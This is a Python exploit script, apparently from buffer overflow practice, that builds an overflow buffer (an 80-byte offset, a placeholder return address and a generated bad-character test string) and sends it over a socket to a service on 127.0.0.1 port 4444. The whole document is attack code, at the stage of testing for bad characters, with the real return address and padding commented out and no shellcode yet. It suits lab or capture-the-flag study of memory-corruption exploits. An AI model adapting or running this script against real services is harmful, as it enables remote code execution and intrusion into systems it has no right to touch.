import os
import time
def exploit(payload, RHOST, RPORT):
    prefix = "2\n"+("1"+ " " * (0x1f-2)+"\n")
    offset = 80
    overflow = "A" * offset
    retn = "BBBB"# "\x62\x50\x12\x03"[::-1]
    padding = "" #"\x90"*10 #+ "\xcc"
    postfix = "\n"

    buffer = prefix + overflow + retn + padding + payload + postfix
    data = buffer

    import socket
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((RHOST,RPORT))
    time.sleep(10)
    print("Sending Data")
    s.send(""+ buffer)
    
### bad Characters ##############
pp = ""
for x in range(0x61, 256):
  if x not in [0x0]:
      #print("\\x" + "{:02x}".format(x), end='')
      pp += ("\\x" + "{:02x}".format(x))
      
#print(pp)
payload = eval('"'+pp+'"')
#print(payload)
#with open("/tmp/binary.bin", "w") as f: f.write(payload)
##################################### 

exploit(payload, '127.0.0.1', 4444)
